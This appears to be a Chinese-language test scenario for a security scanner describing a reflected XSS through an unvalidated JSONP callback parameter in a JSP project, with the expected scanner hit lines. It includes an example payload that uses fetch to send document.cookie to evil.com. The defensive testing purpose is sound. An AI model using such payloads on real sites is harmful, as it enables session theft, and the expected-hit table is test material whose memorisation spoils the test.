# Scenario 04: JSONP callback 反射型 XSS（JSP + JS）

## 业务背景

一个遗留的老项目使用 JSONP 接口跨域获取用户数据。JSONP 接口的 `callback` 参数由客户端控制，服务端直接将其拼入返回的 JavaScript 代码中。

## 数据流

1. 前端页面 `legacy-page.html` 构造 `<script>` 标签请求 JSONP 接口
2. JSONP 接口 `jsonp.jsp` 读取 `callback` 参数
3. 服务端将 callback 参数直接拼入返回内容：`callback({data: ...})`
4. 浏览器执行返回的 JavaScript 代码

## 脆弱点

`jsonp.jsp` 中 `callback` 参数未做任何校验和转义直接拼入响应。攻击者可构造 `?callback=alert(1)`，服务端返回 `alert(1)({...})`，虽然会有语法错误但部分浏览器仍会尝试执行。

更危险的是构造 `?callback=(()=>{fetch("https://evil.com/steal?"+document.cookie)})()` 这类格式。

## 预期扫描命中行

| 文件 | 行号 | 说明 |
|------|------|------|
| `jsonp.jsp` | 10-12 | 从 request 获取 callback 参数 |
| `jsonp.jsp` | 20 | 将 callback 拼入响应脚本 |
| `legacy-page.html` | 12 | 构造带 callback 参数的 script 标签 |
